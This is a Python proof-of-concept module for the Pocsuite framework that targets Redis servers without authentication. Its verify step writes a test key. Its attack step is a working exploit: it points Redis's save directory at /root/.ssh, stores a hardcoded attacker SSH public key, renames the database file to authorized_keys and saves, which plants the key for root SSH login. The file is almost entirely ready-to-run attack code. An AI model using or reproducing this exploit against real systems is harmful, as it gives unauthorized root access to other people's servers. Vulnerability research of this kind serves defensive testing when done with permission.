#!/usr/bin/env python
# -*- coding:utf-8 -*-

import socket
import urlparse
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '89339'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问 PoC'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''
    samples = ['']

    def _get_payload(self, *args):
        args_len = len(args)
        payload = '*{}\r\n'.format(args_len)
        for i in args:
            payload += '${}\r\n{}\r\n'.format(len(i), i)
        print(payload)
        return payload

    def _send_payload(self, payload):
        addr = urlparse.urlparse(self.url).netloc
        recvdata = None
        loop = True
        while loop:
            host, port = addr.split(':')
            s = socket.socket()
            socket.setdefaulttimeout(10)
            s.connect((host, int(port)))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and '-MOVED' in recvdata:
                _, _, addr = recvdata.split()
                addr = addr.strip("\r\n")
            else:
                loop = False
            s.close()
        print(addr, recvdata)
        return addr, recvdata

    def _verify(self):
        result = {}
        # payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        payload = self._get_payload('set', 'crackit', 'evil')
        try:
            addr, recvdata = self._send_payload(payload)
            print(addr, recvdata)
            if recvdata and '+OK' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = addr
        except Exception,e:
            print(e)
            pass
        return self.parse_attack(result)

    def _attack(self):
        result = {}
        payload = self._get_payload('config', 'get', 'dir')
        _, recvdata = self._send_payload(payload)
        
        payload = self._get_payload('config', 'set', 'dir', '/root/.ssh')
        
        try:
            addr, recvdata = self._send_payload(payload)
            if recvdata and '+OK' in recvdata:
                payload = self._get_payload('set', 'crackit', '{}{}{}'.format('\r\n'*3, 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBtXxWX1FGBNSXTJolnc80eBFjoLe5UPKvicmec63n9pA2osM4I2XwazTk8iMmAqKJeDb3Lk+jq7OGRuv5ybjzJt26SmvBYcqGH1SOWKL4Nj439aVG/Sqp4DsKnozDhKthEJnGJQ7JGuVfYYd7BQYsAR9GIeA9PabDxbqMbApdk3BmA7alyD/0HdOitgqxVi6KzdM6wOa8avcJmt/HJHxwscUUIeeW9GPzouaxSEwDyVrxujGMiidgwFLm8Isz0ShpaesMGxyIkx3WTb0nPb3O0STWiQtKFaWZHnQjRx21mgIXYfkIDqDs5K+chAAsPufdUPSKg+yhFMSYlnqmnS8P', '\r\n'*3))
                addr, recvdata = self._send_payload(payload)
                payload = self._get_payload('config', 'set', 'dbfilename', 'authorized_keys')
                addr, recvdata = self._send_payload(payload)
                payload = self._get_payload('save')
                addr, recvdata = self._send_payload(payload)
        except Exception, e:
            print(e)
            pass

        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
